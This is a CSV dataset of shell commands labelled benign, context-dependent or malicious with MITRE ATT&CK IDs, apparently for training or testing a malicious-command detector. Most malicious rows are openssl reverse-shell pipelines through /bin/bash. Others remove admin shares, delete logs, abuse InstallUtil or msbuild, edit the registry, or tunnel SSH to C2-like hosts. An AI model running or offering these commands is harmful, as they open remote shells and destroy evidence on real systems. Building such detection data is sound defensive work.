command,label,original_label,mitre_id
for %i in (C$ IPC$ ADMIN$) do net share %i /delete,Malicious,Malicious,T1070
tail -20 /etc/login.defs,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:4445,Malicious,Synthetic,Synthetic
calcurse-caldav --init=two-way,Benign,Benign,Benign
C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe,Malicious,Malicious,T1218
tcpdump -i ens33 port 443,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:3389,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.8:80 admin@payload.c2,Context_Dependent,Synthetic,Synthetic
msbuild.exe @{PATH:.rsp},Malicious,Malicious,T1036
tcpdump -i wlan0 port 22,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
nginx -s reload,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:80,Malicious,Synthetic,Synthetic
ssh -w 0:0 svcuser@10.0.0.10,Context_Dependent,Synthetic,Synthetic
find . -type f -print0 | xargs -0 perl -pi -e 's/ +$//',Benign,Benign,Benign
route,Benign,Synthetic,Synthetic
dnf builddep --help-cmd,Benign,Benign,Benign
spi [-U|--upgrade],Benign,Benign,Benign
"sops -d --extract '[""an_array""][1]' path/to/file.enc.json",Benign,Benign,Benign
atuin login [-u|--username] username [-p|--password] password,Benign,Benign,Benign
tcpdump -i enp0s3 -c 4444,Context_Dependent,Synthetic,Synthetic
grep -Ff list1.txt list2.txt | sort | uniq -c | sort -n | tail -n1,Benign,Benign,Benign
"nohup php -r 'while (true) { echo ""a"";}' &",Benign,Benign,Benign
pulumi policy enable organization_name/policy_pack_name latest|version,Benign,Benign,Benign
sattach --output|error-filter task_number,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:9002,Malicious,Synthetic,Synthetic
"find . -iname ""needle""",Benign,Benign,Benign
vso remove package1 package2 ...,Benign,Benign,Benign
unset array[`shuf -i 0-4 -n1`];,Benign,Benign,Benign
stat /etc/default/grub,Context_Dependent,Synthetic,Synthetic
dotnet -consoleoutput -noninteractive,Context_Dependent,Malicious,T1518
nslookup lb-01,Benign,Synthetic,Synthetic
acme.sh --issue --dns dns_namesilo --domain example.com --domain *.example.com,Benign,Benign,Benign
"find . -name ""sample*_1.txt"" | perl -pe 's/_1\.txt$//' | parallel program {}-out {}_1.txt {}_2.txt",Benign,Benign,Benign
unrar t compressed.rar,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:993,Malicious,Synthetic,Synthetic
sqlx migrate add -r migration_description,Benign,Benign,Benign
top -bn1 | head -20,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:172.16.5.20:9001 backup@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
nh search [-c|--channel] nixos-unstable name,Benign,Benign,Benign
fastfetch [-l|--logo] none,Benign,Benign,Benign
xcv v output_file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
rmdir path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
zipcloak path/to/archive.zip [-O|--output-file] path/to/encrypted.zip,Benign,Benign,Benign
git init,Benign,Benign,Benign
sdk list sdk_name,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.50:110 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
CloseServiceHandle(),Malicious,Malicious,T1489
"Set objws = CreateObject(""Wscript.Shell"")",Malicious,Malicious,T1546
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:8080,Malicious,Synthetic,Synthetic
"find ${DIR} -type f -regex "".*\.${TYPES_RE}""",Benign,Benign,Benign
"bind '""\e[24~"":""\C-k \C-upwd\n""'",Benign,Benign,Benign
"resticprofile --name ""group_name"" schedule",Benign,Benign,Benign
"System.Console.WriteLine(""tweet, tweet"");",Malicious,Malicious,T1036
tail -20 /etc/apt/sources.list,Context_Dependent,Synthetic,Synthetic
steghide info path/to/file.jpg,Benign,Benign,Benign
grep -i 'ERROR' /var/log/syslog,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
automake,Benign,Benign,Benign
prstat,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
glances [-w|--webserver],Benign,Benign,Benign
infection --test-framework phpunit|phpspec,Benign,Benign,Benign
jj git fetch --remote remote,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:80 operator@192.168.1.1,Context_Dependent,Synthetic,Synthetic
find /full/path/dir -name '*.txt' -print0 | xargs -0 rm,Benign,Benign,Benign
prowler azure --az-cli-auth --subscription-ids subscription_id1 subscription_id2 ...,Benign,Benign,Benign
tcpdump -i wlan0 -w /tmp/.hidden,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
glab repo search [-s|--search] search_string,Benign,Benign,Benign
mid3v2 --year=YYYY path/to/file1.mp3 path/to/file2.mp3 ...,Benign,Benign,Benign
traceroute -n 10.10.10.10,Context_Dependent,Synthetic,Synthetic
sudo zoneadm -z zone_name uninstall,Benign,Benign,Benign
fc --help,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8081,Malicious,Synthetic,Synthetic
sysctl fs.file-nr,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:445,Malicious,Synthetic,Synthetic
lighthouse --output json --output-path path/to/file.json https://example.com,Benign,Benign,Benign
find /dir -type f -print0 | xargs -0i cat {} | grep whatever,Benign,Benign,Benign
"grep -v '^$' | paste -s -d"","" -",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:445,Malicious,Synthetic,Synthetic
tcpdump -i ens33 -c 80,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:4445,Malicious,Synthetic,Synthetic
gnome-calculator,Benign,Benign,Benign
/bin/launchctl load,Malicious,Malicious,T1569
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:6379,Malicious,Synthetic,Synthetic
find /myfiles -atime +30 -exec rm {} \;,Benign,Benign,Benign
nyxt --list-data-profiles,Benign,Benign,Benign
pyenv virtualenvs,Benign,Benign,Benign
"New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter",Malicious,Malicious,T1098
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:993,Malicious,Synthetic,Synthetic
"openai api completions.create --model ada --prompt ""Hello world""",Benign,Benign,Benign
rm -rf /var/log/*.log,Malicious,Synthetic,Synthetic
sudo lvconvert [-m|--mirrors] 0 /dev/vg_name/lv_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:53,Malicious,Synthetic,Synthetic
jf config show,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.10:8888 user@10.0.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
slurmd -h,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
zellij [-s|--session] name,Benign,Benign,Benign
zsync -i path/to/existing_file path/to/url.zsync,Benign,Benign,Benign
cheatshh [-ec|--edit-command],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
npm team destroy organization:team,Benign,Benign,Benign
toilet input_text [-f|--font] font_filename,Benign,Benign,Benign
pulumi destroy --continue-on-error,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:9090,Malicious,Synthetic,Synthetic
asciiart [-w|--width] 50 path/to/image.jpg,Benign,Benign,Benign
shellcheck [-a|--check-sourced] path/to/script.sh,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
"find . -name ""*.pyc"" | xargs -i rm '{}",Benign,Benign,Benign
"trdsql -ocsv -oh ""SELECT * FROM path/to/directory/*.json"" | sed 's/\([^,]*\)/""&""/g' > path/to/file.csv",Benign,Benign,Benign
ls -ld /tmp /tnt | sed 's/^.*$/<-- & --->/',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
zlib-flate < path/to/input_file -compress > path/to/compressed.zlib,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
waydroid show-full-ui,Benign,Benign,Benign
routel table_number|main|local|default,Benign,Benign,Benign
find -L . -type l -delete -exec ln -s new_target {} \;,Benign,Benign,Benign
"husky set .husky/pre-push ""command command_arguments""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:9002,Malicious,Synthetic,Synthetic
sf force:org:list,Benign,Benign,Benign
browsh --startup-url URL,Benign,Benign,Benign
docker network inspect network_name1 network_name2 ...,Benign,Benign,Benign
taskset 1 /bin/sh,Malicious,Malicious,T1059
file --mime myfile.txt,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
"Invoke-WebRequest $domain -UserAgent ""Opera/8.81 (Windows NT 6.0; U; en)"" | out-null",Malicious,Malicious,T1071
openssl s_client -quiet -connect 192.168.1.10:53 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ltrace -c path/to/program,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:4445,Malicious,Synthetic,Synthetic
pkgctl diff [-b|--buildinfo] path/to/file|pkgname,Benign,Benign,Benign
fincore path/to/file,Benign,Benign,Benign
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f",Malicious,Malicious,T1112
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:143,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:5432,Malicious,Synthetic,Synthetic
postconf -d,Benign,Benign,Benign
"cat $(find src/js -type f -name ""*.js"" -printf ""%d\t%p\n"" | sort -n | sed -e ""s|[0-9]*\t||"")>min.js",Benign,Benign,Benign
debuild,Benign,Benign,Benign
mkfile -n 15k path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9001,Malicious,Synthetic,Synthetic
flashrom [-p|--programmer] linux_spi:dev=/dev/spidev0.0,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
packwiz refresh,Benign,Benign,Benign
retry [-d|--delay] n command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8081,Malicious,Synthetic,Synthetic
"copy ""$service_executable"" ""C:\Program Files\windows_service.exe""",Malicious,Malicious,T1574
github-label-sync --access-token token repository_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:9090,Malicious,Synthetic,Synthetic
lambo new [-p|--path] path/to/directory app_name,Benign,Benign,Benign
sudo grub-probe [-t|--target] fs_uuid /boot/grub,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9001,Malicious,Synthetic,Synthetic
zm new,Benign,Benign,Benign
history -r /path/to/input-file,Context_Dependent,Malicious,T1005
find -perm 664,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
"echo -n ""Hello"" | od -A n -t x1",Benign,Benign,Benign
colorpicker --rgb,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:8888 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
tldr ptpython,Benign,Benign,Benign
matchpathcon -V /path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
find $HOME -name '*.c' -print | xargs grep -l sprintf,Benign,Benign,Benign
dpkg-deb [-x|--extract] path/to/file.deb path/to/directory,Benign,Benign,Benign
ssh -w 0:0 backup@10.0.0.100,Context_Dependent,Synthetic,Synthetic
systemd-sysusers --dry-run path/to/file,Benign,Benign,Benign
adb shell pm revoke package android.permission.CAMERA|android.permission.ACCESS_FINE_LOCATION|android.permission.READ_CONTACTS|...,Benign,Benign,Benign
mv Tux.png .Tux.png,Benign,Benign,Benign
bundletool get-device-spec --output path/to/file.json,Benign,Benign,Benign
terminal-notifier -message 'Imported 42 contacts.' -activate com.apple.AddressBook,Benign,Benign,Benign
libtool [e|execute] gdb path/to/program,Benign,Benign,Benign
kinit -p principal@REALM,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:8080,Malicious,Synthetic,Synthetic
sed -i 's/old/new/g' config.txt,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:4445,Malicious,Synthetic,Synthetic
cd -P ..,Benign,Benign,Benign
"xxh ""host"" ++install-xxh-packages package",Benign,Benign,Benign
tcpdump -i eth0 -w /tmp/.upd,Context_Dependent,Synthetic,Synthetic
query process session_name|user_name,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:8443 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:993,Malicious,Synthetic,Synthetic
tail -20 /etc/sysctl.conf,Context_Dependent,Synthetic,Synthetic
rbc.close();,Malicious,Malicious,T1105
ssh -fN -L 8080:10.10.10.10:993 deploy@10.0.0.1,Context_Dependent,Synthetic,Synthetic
npm [c|config] set browser true|false,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:9002,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:172.16.0.25:80 postgres@files.company.local,Context_Dependent,Synthetic,Synthetic
cancel -a printer,Benign,Benign,Benign
"find /nas/projects/mgmt/scripts/perl -mtime 8 -mtime -10 -daystart -iname ""*.pl""",Benign,Benign,Benign
"find . -name ""*.txt"" -prune -o -print",Benign,Benign,Benign
lpass show myinbox --password,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:9002,Malicious,Synthetic,Synthetic
gdown --fuzzy url,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
